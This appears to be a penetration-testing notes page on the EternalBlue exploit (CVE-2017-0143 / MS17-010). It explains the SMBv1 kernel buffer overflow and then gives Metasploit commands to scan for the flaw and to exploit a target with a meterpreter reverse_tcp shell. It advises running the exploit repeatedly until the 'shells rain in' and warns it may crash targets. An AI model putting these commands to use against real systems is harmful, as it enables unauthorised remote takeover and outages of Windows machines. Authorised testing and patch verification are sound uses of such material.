icon:fontawesome/solid/unlock-keyhole

# CVE-2017-0143

CVE-2017-0143 | MS17-010

- MS17-010
- CVE-2017-0143
- CVE-2017-0144
- CVE-2017-0145
- CVE-2017-0146
- CVE-2017-0148
- CVE-2017-0147

This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete.

This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.

## Scanner

```bash
msf5 > use auxiliary/scanner/smb/smb_ms17_010
```

## Exploit

```bash
msf5 > use exploit/windows/smb/ms17_010_eternalblue
msf5 > set rhost <target>
msf5 > set payload windows/x64/meterpreter/reverse_tcp
msf5 > set lhost <own-system>
msf5 > run
```

## References

- [Docs.microsoft.com](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [GitHub](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS17-010)
